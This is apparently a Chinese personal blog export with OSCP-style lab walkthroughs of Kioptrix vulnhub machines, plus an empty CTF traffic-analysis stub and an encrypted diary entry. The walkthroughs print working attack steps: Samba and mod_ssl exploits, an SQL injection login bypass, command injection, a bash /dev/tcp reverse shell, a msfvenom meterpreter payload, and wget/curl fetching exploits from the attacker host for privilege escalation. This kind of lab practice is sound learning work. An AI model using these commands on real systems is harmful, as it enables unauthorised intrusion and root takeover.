<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -sn xxxx </span><br></pre></td></tr></table></figure></div>

<p><strong>拿到目标ip为<code>192.168.89.132</code></strong></p>
<ul>
<li>nmap扫描端口</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -sV -p- -T4 xxxx</span><br></pre></td></tr></table></figure></div>

<p>-sV 列举出端口使用协议或服务的版本信息</p>
<p>-p- 扫描全端口</p>
<p>-T4 设置线程数 <code>加快扫描速度</code></p>
<p><strong>开放端口信息：</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-29 08:00 EST</span><br><span class="line">Nmap scan report for localhost (192.168.89.132)</span><br><span class="line">Host is up (0.0021s latency).</span><br><span class="line">Not shown: 65529 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)</span><br><span class="line">80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)</span><br><span class="line">111/tcp  open  rpcbind     2 (RPC #100000)</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd (workgroup: XMYGROUP)</span><br><span class="line">443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</span><br><span class="line">1024/tcp open  status      1 (RPC #100024)</span><br><span class="line">MAC Address: 00:0C:29:A6:90:BB (VMware)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 24.09 seconds</span><br></pre></td></tr></table></figure></div>

<h3 id="思路1——Samba-139端口"><a href="#思路1——Samba-139端口" class="headerlink" title="思路1——Samba 139端口"></a>思路1——Samba 139端口</h3><h4 id="查询Samba版本"><a href="#查询Samba版本" class="headerlink" title="查询Samba版本"></a>查询Samba版本</h4><ul>
<li><p>三种工具：<code>enum4linux</code>、<code>smbclient</code>、<code>metasploit</code></p>
<ul>
<li>smbclient -L=<ip></ip></li>
</ul>
</li>
<li><p>这里使用metasploit的Auxiliary模块</p>
</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%889.19.41.png" alt="截屏2024-01-29_下午9.19.41"></p>
<ul>
<li>设置RHOSTS <strong>得到smb版本：2.2.1a</strong></li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%889.21.32-9034244.png" alt="截屏2024-01-29_下午9.21.32"></p>
<p>==注意：oscp中不允许使用msf，这里仅供学习==</p>
<h4 id="寻找exploit"><a href="#寻找exploit" class="headerlink" title="寻找exploit"></a>寻找exploit</h4><ul>
<li>工具：<code>searchsploit</code></li>
<li>用searchsploit 查找：<code>searchsploit Samba 2.2.1a</code></li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%889.29.16-9034252.png" alt="截屏2024-01-29_下午9.29.16"></p>
<p><strong>发现存在trans2open Overflow的漏洞</strong></p>
<ul>
<li><p>在github中找到了脚本：<a class="link" href="https://github.com/KernelPan1k/trans2open-CVE-2003-0201/blob/master/trans2open.c">https://github.com/KernelPan1k/trans2open-CVE-2003-0201/blob/master/trans2open.c <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</li>
<li><p>事实证明，searchsploit里面自己存的multiple/remote/10.c 脚本也可以用，需要使用命令：<code>searchsploit -m multiple/remote/10.c</code>，复制到当前目录</p>
</li>
</ul>
<h4 id="编译和运行脚本"><a href="#编译和运行脚本" class="headerlink" title="编译和运行脚本"></a>编译和运行脚本</h4><h5 id="github脚本"><a href="#github脚本" class="headerlink" title="github脚本"></a>github脚本</h5><ul>
<li><p>编译：<code>gcc trans2open.c -o trans2open </code></p>
</li>
<li><p>运行：<code>./trans2open</code></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Samba &lt; 2.2.8 Remote Root exploit by Schizoprenic</span><br><span class="line">Connect back method, Xnuxer-Labs, 2003.</span><br><span class="line">Usage  : ./trans2open &lt;type&gt; &lt;victim&gt; &lt;your_ip&gt;</span><br><span class="line">Targets:</span><br><span class="line">         0 = Linux</span><br><span class="line">         1 = FreeBSD/NetBSD</span><br><span class="line">         2 = OpenBSD 3.0 and prior</span><br><span class="line">         3 = OpenBSD 3.2 - non-exec stack</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>根据提示：<code>./trans2open 0 192.168.89.132 192.168.89.137 </code></p>
</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%889.34.28-9034261.png" alt="截屏2024-01-29_下午9.34.28"></p>
<h5 id="searchsploit自带脚本"><a href="#searchsploit自带脚本" class="headerlink" title="searchsploit自带脚本"></a>searchsploit自带脚本</h5><ul>
<li><p>编译</p>
</li>
<li><p>运行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">samba-2.2.8 &lt; remote root exploit by eSDee (www.netric.org|be)                                                                  </span><br><span class="line">--------------------------------------------------------------                                                                  </span><br><span class="line">Usage: ./10 [-bBcCdfprsStv] [host]                                                                                              </span><br><span class="line">                                                                                                                                </span><br><span class="line">-b    bruteforce (0 = Linux, 1 = FreeBSD/NetBSD, 2 = OpenBSD 3.1 and prior, 3 = OpenBSD 3.2)                          </span><br><span class="line">-B        bruteforce steps (default = 300)                                                                                </span><br><span class="line">-c  connectback ip address                                                                                          </span><br><span class="line">-C  max childs for scan/bruteforce mode (default = 40)                                                              </span><br><span class="line">-d       bruteforce/scanmode delay in micro seconds (default = 100000)                                                   </span><br><span class="line">-f              force                                                                                                           </span><br><span class="line">-p        port to attack (default = 139)                                                                                  </span><br><span class="line">-r         return address                                                                                                  </span><br><span class="line">-s              scan mode (random)                                                                                              </span><br><span class="line">-S     scan mode                                                                                                       </span><br><span class="line">-t        presets (0 for a list)                                                                                          </span><br><span class="line">-v              verbose mode     </span><br></pre></td></tr></table></figure></div>
</li>
<li><p>根据提示：<code>./10 -b 0 192.168.89.132</code></p>
</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%8810.29.37.png" alt="截屏2024-01-29_下午10.29.37"></p>
<h3 id="思路2-——mod-ssl-2-8-4-端口443"><a href="#思路2-——mod-ssl-2-8-4-端口443" class="headerlink" title="思路2 ——mod_ssl/2.8.4 端口443"></a>思路2 ——mod_ssl/2.8.4 端口443</h3><h4 id="版本信息"><a href="#版本信息" class="headerlink" title="版本信息"></a>版本信息</h4><p>这里nmap把版本写的很清楚：443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</p>
<h4 id="寻找exploit-1"><a href="#寻找exploit-1" class="headerlink" title="寻找exploit"></a>寻找exploit</h4><ul>
<li><code>searchsploit mod_ssl 2.8.4</code></li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%8811.33.13.png" alt="截屏2024-01-29_下午11.33.13"></p>
<p><strong>挑选一个数值更大的文件：47080.c</strong></p>
<ul>
<li><code>searchsploit -x unix/remote/47080.c</code></li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%8811.35.09.png" alt="截屏2024-01-29_下午11.35.09"></p>
<p><strong>仔细看注释，里面写了requirements和编译命令</strong></p>
<h4 id="编译和运行脚本-1"><a href="#编译和运行脚本-1" class="headerlink" title="编译和运行脚本"></a>编译和运行脚本</h4><p>这个步骤其实就是根据提示补全命令，运行脚本后，可以直接拿到root（理论上）。</p>
<p>事实上，我尝试了很久，大概在七八次的时候才拿到root（碰运气）</p>
<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%8811.29.06.png" alt="截屏2024-01-29_下午11.29.06"></p>
<p>在此之前都是拿到一个普通用户apache的权限，因此，我学习了一些提权知识，详见<code>学习总结——关于Linux提权</code>。</p>
<h2 id="学习总结"><a href="#学习总结" class="headerlink" title="学习总结"></a>学习总结</h2><h3 id="关于Samba"><a href="#关于Samba" class="headerlink" title="关于Samba"></a>关于Samba</h3><p>Samba 是在 Linux 和 UNIX 系统上实现 SMB 协议的一个免费软件，由服务器及客户端程序构成。Samba 是能够在任何支持 SMB 协议的主机之间共享文件的一种实现，当然也包括 windows。SMB 是一种在局域网上共享文件和打印机的一种通信协议，它为局域网内的不同计算机之间提供文件及打印机等资源的共享服务。SMB 协议是 C/S 型协议，客户机通过该协议可以访问服务器上的共享文件系统、打印机及其他资源。</p>
<h3 id="关于MSF的Auxiliary"><a href="#关于MSF的Auxiliary" class="headerlink" title="关于MSF的Auxiliary"></a>关于MSF的Auxiliary</h3><p>auxiliary 本身意思为辅助的</p>
<p>在msf中代表辅助探测模块：该模块不会直接在攻击机和靶机之间建立访问，它们只负责执行扫描，嗅探，指纹识别等相关功能以辅助渗透测试。</p>
<p><strong>本次渗透测试用于查询smb服务版本</strong></p>
<h3 id="关于Linux-提权（部分）"><a href="#关于Linux-提权（部分）" class="headerlink" title="关于Linux 提权（部分）"></a>关于Linux 提权（部分）</h3><p>此处是因为一点小bug，脚本在运行的时候wget不稳定，导致提权脚本没拉到本地，因此没有成功，只有一个普通用户的权限。</p>
<p>在遇到这个问题的时候，我顺便学习了一点提权知识：</p>
<ul>
<li>利用linux内核版本信息（uname -a在靶机上查看），然后在攻击机上搜索exploit</li>
<li>通过爆破脚本，暴力破解root密码</li>
</ul>
<p>但提权过程基本是：<strong>寻找exploit或相关脚本，通过在攻击机上开启apache服务，将脚本上传到/var/www/html之中，然后靶机通过wget http://攻击机ip/目标脚本 拿到本地执行</strong></p>
]]></content>
      <categories>
        <category>类OSCP靶机练习</category>
      </categories>
      <tags>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF_MISC流量分析总结</title>
    <url>/2024/03/12/MISC-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h2><h2 id="USB流量"><a href="#USB流量" class="headerlink" title="USB流量"></a>USB流量</h2><h2 id="TLS流量"><a href="#TLS流量" class="headerlink" title="TLS流量"></a>TLS流量</h2><h2 id="webshell流量"><a href="#webshell流量" class="headerlink" title="webshell流量"></a>webshell流量</h2><h2 id="sql注入流量"><a href="#sql注入流量" class="headerlink" title="sql注入流量"></a>sql注入流量</h2><h2 id="大流量"><a href="#大流量" class="headerlink" title="大流量"></a>大流量</h2><blockquote>
<p>数据处理：<a class="link" href="https://zhuanlan.zhihu.com/p/35623547">模拟企业网络流量进行入侵溯源分析 - 知乎 (zhihu.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
]]></content>
      <categories>
        <category>CTF知识积累</category>
      </categories>
      <tags>
        <tag>MISC-流量分析</tag>
      </tags>
  </entry>
  <entry>
    <title>Kioptrix Level 1.1(#2)</title>
    <url>/2024/02/03/Kioptrix_Level_1.1/</url>
    <content><![CDATA[<h1 id="Kioptrix-Level-1-1-2"><a href="#Kioptrix-Level-1-1-2" class="headerlink" title="Kioptrix Level 1.1(#2)"></a>Kioptrix Level 1.1(#2)</h1><blockquote>
<p>参考 <a class="link" href="https://hummus-ful.github.io/vulnhub/2021/01/25/Kioptrix_2.html">Kioptrix: Level 1.1 (#2) | Hacking Walkthroughs, Writeups and Guides (hummus-ful.github.io) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<h2 id="渗透思路"><a href="#渗透思路" class="headerlink" title="渗透思路"></a>渗透思路</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><ul>
<li>nmap扫描ip，得到IP为<code>192.168.89.138</code></li>
<li>nmap扫描端口及端口服务</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-02 10:25 EST</span><br><span class="line">Nmap scan report for localhost (192.168.89.138)</span><br><span class="line">Host is up (0.00071s latency).</span><br><span class="line">Not shown: 65528 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)</span><br><span class="line">80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))</span><br><span class="line">111/tcp  open  rpcbind  2 (RPC #100000)</span><br><span class="line">443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))</span><br><span class="line">605/tcp  open  status   1 (RPC #100024)</span><br><span class="line">631/tcp  open  ipp      CUPS 1.1</span><br><span class="line">3306/tcp open  mysql    MySQL (unauthorized)</span><br><span class="line">MAC Address: 00:50:56:39:80:A3 (VMware)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 28.70 seconds</span><br></pre></td></tr></table></figure></div>

<p><strong>看到了web服务：80端口和443端口</strong></p>
<ul>
<li>用浏览器访问<code>http://192.168.89.138</code>，发现是一个登录界面</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.08.05.png" alt="截屏2024-02-03_下午5.08.05"></p>
<ul>
<li>F12 查看源代码</li>
</ul>
<img lazyload src="/images/loading.svg" data-src="Kioptrix_Level_1.1/截屏2024-02-03_下午5.09.55.png" alt="截屏2024-02-03_下午5.09.55" style="zoom:70%;">

<p>看到<code>Start of HTML when logged in as Administartor</code>，推测用户名为<code>Administrator</code>(其实好像无关，但一些CTFer的基因动了，有些敏感hhh)</p>
<h4 id="我的体验"><a href="#我的体验" class="headerlink" title="我的体验"></a>我的体验</h4><p>信息收集还算成功，也找到了突破口是web服务，看到登录表，第一想法就是sql注入，但死在web渗透经验为0，且sql注入不熟悉，因此卡在了这里。需要从0开始训练一下sql注入。</p>
<h3 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h3><h4 id="Sql注入"><a href="#Sql注入" class="headerlink" title="Sql注入"></a>Sql注入</h4><ul>
<li><p>在username中输入<code>Administrator</code>(事实上随便输入什么都可以)，接着在password中输入<code>&#39; or &#39;1&#39; = &#39;1 </code>（这里的sql注入很简单，很多思路都是可以的）</p>
</li>
<li><p>还有一篇walkthrough里面有人是username输入<code>admin&#39; or 1=1-- s</code>(这里的s不必要，但是–后必须有空格)，然后password随意输入</p>
<ul>
<li><em><strong>–是一种sql的单行注释语句，注意：–后面有空格</strong></em></li>
</ul>
</li>
<li><p>成功后看到以下页面：</p>
</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.35.22.png" alt="截屏2024-02-03_下午5.35.22"></p>
<h4 id="寻找漏洞：RCE漏洞"><a href="#寻找漏洞：RCE漏洞" class="headerlink" title="寻找漏洞：RCE漏洞"></a>寻找漏洞：RCE漏洞</h4><ul>
<li>根据提示：ping a machine on the network，随便填了一个ip<code>8.8.8.8</code>，发现会显示shell命令以及执行结果</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.48.17.png" alt="截屏2024-02-03_下午5.48.17"></p>
<ul>
<li>猜测存在RCE漏洞：Remote Code/Command Execute（第一次知道这叫做RCE），输入<code>8.8.8.8;whoami</code></li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.50.46.png" alt="截屏2024-02-03_下午5.50.46"></p>
<p>看到了whoami的结果<code>apache</code>，<em>看来拿到shell之后还要提权了</em></p>
<p><strong>证明确实存在RCE</strong></p>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h5 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h5><blockquote>
<p>参考 <a class="link" href="https://www.jianshu.com/p/9456473a0a14">Linux下几种常见的反弹shell方式 - 简书 (jianshu.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<h6 id="0x01-bash建立tcp连接"><a href="#0x01-bash建立tcp连接" class="headerlink" title="0x01 bash建立tcp连接"></a>0x01 bash建立tcp连接</h6><ul>
<li><p>利用<code>bash -i &gt;&amp; /dev/tcp/192.168.89.137/4444 0&gt;&amp;1</code>，反弹shell</p>
</li>
<li><p>在kali攻击机中开启监听 <code>nc -nvlp 4444</code></p>
</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%886.01.38.png" alt="截屏2024-02-03_下午6.01.38"></p>
<p>成功拿到shell，但只是个权限很低的apache用户，接下来就是提权了</p>
<h6 id="0x02-msfvenom生成后门"><a href="#0x02-msfvenom生成后门" class="headerlink" title="0x02 msfvenom生成后门"></a>0x02 msfvenom生成后门</h6><blockquote>
<p>参考<a class="link" href="https://www.cnblogs.com/wsec/p/vulnhub0x02.html">0×02 Vulnhub靶机渗透总结之 KIOPTRIX: LEVEL 1.1  常规命令注入+内核提权 - wsec - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<ul>
<li><code>msfvenom</code>生成后门命名为<code>shell4444</code>，开启http服务上传shell给靶机下载，msf进行监听，然后靶场执行shell，成功反弹shell</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.89.137 LPOTR=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -f elf -o shell4444</span><br></pre></td></tr></table></figure></div>



<h3 id="Linux-提权-Linux-Privilege-Escalation"><a href="#Linux-提权-Linux-Privilege-Escalation" class="headerlink" title="Linux 提权  Linux Privilege Escalation"></a>Linux 提权  Linux Privilege Escalation</h3><blockquote>
<p>参考 <a class="link" href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation">Linux 提权 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<h4 id="提权信息收集"><a href="#提权信息收集" class="headerlink" title="提权信息收集"></a>提权信息收集</h4><ul>
<li>根据参考，使用<code>lsb_release -a 2&gt;/dev/null</code>查看os信息</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">(cat /proc/version || uname -a ) 2&gt;/dev/null</span><br><span class="line">lsb_release -a 2&gt;/dev/null # old, not by default on many systems</span><br><span class="line">cat /etc/os-release 2&gt;/dev/null # universal on modern systems</span><br></pre></td></tr></table></figure></div>

<p><em>2&gt;/dev/null 是把标准错误输出到“黑洞”，即删除错误信息，可以解决大量屏幕输出的问题</em></p>
<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8810.46.56.png" alt="截屏2024-02-03_下午10.46.56"></p>
<p><strong>发现Linux版本是CentOS 4.5</strong></p>
<ul>
<li>还有一种工具<code>LinEnum.sh</code>脚本可以枚举目标靶机版本信息、用户信息、权限信息、环境信息、第三方软件信息，进程信息等</li>
</ul>
<blockquote>
<p>关于工具使用：<a class="link" href="https://blog.csdn.net/weixin_43571641/article/details/124374101">Linux提权辅助工具_./linux-exploit-suggester.sh-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<h4 id="寻找CentOS-4-5漏洞利用提权脚本"><a href="#寻找CentOS-4-5漏洞利用提权脚本" class="headerlink" title="寻找CentOS 4.5漏洞利用提权脚本"></a>寻找CentOS 4.5漏洞利用提权脚本</h4><ul>
<li><code>searchsploit CentOS 4.5</code></li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8810.54.18.png" alt="截屏2024-02-03_下午10.54.18"></p>
<ul>
<li>存到本地 <code>searchsploit -m linux_x86/local/9542.c</code></li>
</ul>
<h4 id="将脚本传到靶机"><a href="#将脚本传到靶机" class="headerlink" title="将脚本传到靶机"></a>将脚本传到靶机</h4><h5 id="0x01-Python-SimpleHTTPServer-快速共享当前目录"><a href="#0x01-Python-SimpleHTTPServer-快速共享当前目录" class="headerlink" title="0x01 Python SimpleHTTPServer 快速共享当前目录"></a>0x01 Python SimpleHTTPServer 快速共享当前目录</h5><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Python2</span></span><br><span class="line">python -m SimpleHTTPServer &lt;port&gt;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Python3</span></span><br><span class="line">python3 -m http.server &lt;port&gt;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>在攻击机 <code>9542.c</code>所在目录使用命令<code>python3 -m http.server 6789</code></li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.09.57.png" alt="截屏2024-02-03_下午11.09.57"></p>
<ul>
<li>靶机通过<code>curl http://192.168.89.137:6789/9542.c --output /tmp/9542.c</code> 拉取文件至本地</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.13.18.png" alt="截屏2024-02-03_下午11.13.18"></p>
<p>==<em><strong>这里output设置的路径，对于当前用户来说，必须要有写的权限，通过在根目录下<code>ls -al</code>看到apache用户只在<code>/tmp</code>文件中拥有<code>wx</code>的权限，因此选择存在<code>/tmp</code>文件下</strong></em>==</p>
<ul>
<li>同时在攻击机上也可以看到靶机的信息</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.16.41.png" alt="截屏2024-02-03_下午11.16.41"></p>
<h5 id="0x02-service-apache2-start"><a href="#0x02-service-apache2-start" class="headerlink" title="0x02 service apache2 start"></a>0x02 service apache2 start</h5><ul>
<li><p>在攻击机上打开apache服务：<code>sudo service apache2 start</code></p>
</li>
<li><p>在攻击机上将9542.c 传到<code>/var/www/html</code>文件夹中：<code>sudo mv 9542.c /var/www/html</code></p>
</li>
<li><p>靶机通过<code>wget/curl</code>拉取文件：<code>wget http://192.168.89.137/9542.c</code></p>
</li>
<li><p>同样需要注意<strong>存储的文件夹权限问题</strong></p>
</li>
</ul>
<h4 id="编译运行脚本"><a href="#编译运行脚本" class="headerlink" title="编译运行脚本"></a>编译运行脚本</h4><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">gcc ./9542.c -o 9542 #编译</span><br><span class="line">./9542 #运行</span><br></pre></td></tr></table></figure></div>

<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.23.15.png" alt="截屏2024-02-03_下午11.23.15"></p>
<h2 id="学习总结"><a href="#学习总结" class="headerlink" title="学习总结"></a>学习总结</h2><blockquote>
<p>优秀总结：<a class="link" href="https://www.cnblogs.com/wsec/p/vulnhub0x02.html">0×02 Vulnhub靶机渗透总结之 KIOPTRIX: LEVEL 1.1 (#2) 常规命令注入+内核提权 - wsec - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<h3 id="关于631端口-ipp服务-CUPS-1-1"><a href="#关于631端口-ipp服务-CUPS-1-1" class="headerlink" title="关于631端口 ipp服务 CUPS 1.1"></a>关于631端口 ipp服务 CUPS 1.1</h3><ul>
<li>是一种打印机相关的服务，searchsploit找到了一些提权脚本，但靶机没有打印机设备</li>
</ul>
<h3 id="关于渗透方向"><a href="#关于渗透方向" class="headerlink" title="关于渗透方向"></a>关于渗透方向</h3><ul>
<li>根据靶机打开的端口，一一尝试后，成功找到了RCE的web漏洞</li>
</ul>
<h3 id="关于-Linux-提权"><a href="#关于-Linux-提权" class="headerlink" title="关于 Linux 提权"></a>关于 Linux 提权</h3><ul>
<li><p>尝试过sudo提权，这也是一种方向，但无法利用，失败告终</p>
</li>
<li><p>利用os信息收集，有自动化脚本，已安装到我的tools文件夹中，详见[Linux 提权  Linux Privilege Escalation](#Linux 提权  Linux Privilege Escalation)章节</p>
<ul>
<li>LinEnum 可以枚举信息</li>
<li>lse.sh 可以枚举一些系统可能存在的漏洞信息</li>
</ul>
<p>以上都是要在靶机中运行的，因此脚本需要通过http服务传到靶机中</p>
</li>
<li><p>还要注意当前用户是否在某目录拥有wx权限，通常<code>/tmp</code>文件夹可以</p>
</li>
</ul>
<h3 id="关于主机间传文件-via-http"><a href="#关于主机间传文件-via-http" class="headerlink" title="关于主机间传文件 via http"></a>关于主机间传文件 via http</h3><ul>
<li>Python建立简单http服务</li>
<li>在攻击机中开启apache</li>
</ul>
<h3 id="关于web渗透sql注入"><a href="#关于web渗透sql注入" class="headerlink" title="关于web渗透sql注入"></a>关于web渗透sql注入</h3><ul>
<li>sql注入知识（<strong>有待进一步学习</strong>）</li>
</ul>
]]></content>
      <categories>
        <category>类OSCP靶机练习</category>
      </categories>
      <tags>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>Mad1sun&#39;s_diary</title>
    <url>/2024/03/04/Mad1sun-s-diary/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="不正确，再试一次～" data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="075ccf1543005f7453a6b60f38722a7a42766389e9a0ec744823689d17a79416">8c76022e97a58cf7bdb38a6c611ba5afe6d77c112047be7c42efabbb76a9fb8dbe94d7f737c5cd469505c4a4f08a7b6f667c2bcc7e8bcc1101e50b7049df7119ef282aa8ae99dbbb8171861bcfb1b1dddc1d6384602f77af8ed62b7441ca57a8a2310eb6a37d7ea9c178724cb1e86e84df4fda9aaf10ed03e76ef92f0644b615f52ca4e2c8bf4051f2818e0afe618fd552766300d8d61e95c00f98538f6082f41c0f65fe2529d35367bc9caec7c3f8fbd659f03b984237ffc6e60f7b7a81d3835d63ab3965182ed1f33123241da04f6cee3218fd6d2cc3064bb011503840a750f6c16d0e639cd66ad7b4a8ca22420bda45d991c6a4663b4fab83d6e665abd1bee27bde2881f5ba87bcb1cea799e1d831d3fb196e27939eaae30aa831edfb244b4c9e6c06824c8e5583fc441df06c7685f11d72f539630e5e55fbc88872c0e5807c64fc6ce12e6bb7967b35d9c291f510309c1a96c3b18b4cdf94f77883556b866253734d276b26686b94938b711c8eead1bb8a53fdac73b34f6eaadeccec954979a7b5bd5f0e1c0c5ffc58cf88a44a409991cfa824f146c75d1bb748903094f6c2b09a66339b3af423cf82bc30134a5af43c34422354661e31d237384f65819f11a17fb661b6d07dc3409eb05bcd7034018b484add8742729dd27bac4ea54dc0d1005f99935da83595a2c386daf1641e15030ea4749d04d2708939e1362c27297e76191ae7ebf7d85b36ee5e0188e70be084c62b17cd1281b1cea02ed5d0aa51f662f2e63ba398a5db86c4740bf5823f0ba677344ffbd33ebf168114256691fe28be77a66b97c6f4e0a4981cb38aa31862dcf0c0fe27ad12a69f4d7d0606a9981d5332acc0ebaa378b93ea65776f1871e3f62c9ee3bae2c10d1fe18259147c4321dd8e433323f5484c2fc9ec15cb06674acdce4e270158d1969b7fa82d68a4b06f9198d197e731f32ccef9b8b87c5c61e4c392fb4c9bf69809b56b28cfc198b54b4727a7205b02e038a69e87f9cd58914416ccfa956d4c36f08f908dc42d21138e095fa8d0e7ddc6a6bcce77887f450dec1c83ad2c3862c3bfb20c9587d5db37870ee4f97fbd7f515a3497904c1ffe0b48bdce0bd6877856e179af67c5f7a911988fc164c9ea9eb6c2c174bf3f3729c286dde9b4f6cfc7cf858d98266908aecc6ee4e2f65c831f5269bc99e29da01155fd44e72277355314c08ea10fe399d1d799ee82d7b2555871041a4125cebe0c480eec28b74804cb9799aa9acd4a10b47100ef750748387c71013e894f905b4fb43f0adffa316e6ad05db7fa5a174b86f3433b8dfb0122aac8884be1eb16a294cce62ec0bfa4a8d0001988a56d8e2673f8b2406ff343d2c46c12d667db16ceb6146fae3d1a8c56f678a27b034aff048924475e0fd54291c1e8bcaf5ab898b0314305543e55893ed782f50c1b489af0a3ede018ded8204c5743aa6630b7dd39bc4d31b4629f1a4a8d05c1f532a1234f885ce6e16ee6959a18b6cec92d9cb47698a61b9bda2c11fd6214105713